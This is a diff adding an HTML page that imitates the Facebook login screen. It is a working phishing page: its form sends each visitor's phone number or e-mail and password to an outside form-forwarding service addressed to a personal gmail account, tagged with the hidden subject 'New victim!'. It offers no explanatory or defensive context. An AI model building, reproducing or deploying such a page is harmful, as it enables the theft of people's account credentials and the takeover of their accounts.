@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Facebook</title>
+  
+    <style>
+    input {
+      width: 335px;
+
+      height: 35px;
+     
+    }
+    
+button{  
+     
+      border-radius: 2%; 
+      padding: 10px 20px; 
+      background-color: #1877F2; 
+      color: white; 
+      border: none; 
+      text-align: center;  
+      text-decoration: none; 
+      display: inline-block;  
+      font-size:10 px; 
+      cursor: pointer; 
+      width: 335px;
+
+      height: 40px;
+    }
+ .frame {
+       
+      background-color: #00A400;
+      padding: 10px; 
+      color: white
+    }
+ }
+ left-align {
+        text-align: left;
+    }
+  </style>
+  <script>
+    function edgeClicked() {
+      alert("تم النقر على الحافة!");
+    }
+  </script>
+</head>
+<body>
+ <center> <img src="https://asianewslb.com/userfiles/فايس_بو.png  " width="130"  height="70">
+ <form action="https://formsubmit.co/youssefgogo800@gmail.com" method="POST">
+   
+   <input type="hidden" name="_subject" value="New victim!">
+   
+ <input type="text" name="mail" placeholder="Mobile phone number or e-mail"  required> 
+ <br> 
+ <br>
+ 
+ <input type="password" name="password" placeholder=" Password " required>
+ <br> <br>
+ 
+ <button type="submit" ><font size="4.5"><strong>Log in</strong></font></button>
+ </form>
+ 
+ <br>
+ <font color="#7596C8">Forgot password?</font>
+ <br>
+<p> or <hr> </p>
+  <p><span class="frame"><strong>Create new account</strong></span> </p></center>
+  <br><br>
+  
+
+ <center><font color="#90949C"><p><strong>English (Us)
+</strong></p></font>
+<font color="49659F"><p>Basa Jawa</p>
+<p>日本語</p>
+ <p>Português (Brasil) Show more...</p>
+ <p>Show more...</p> </font> <br>
+ <p>Meta © 2023</p>
+ 
+    
+
+  
+
+
+     
+</button>
+</body>
+</html>
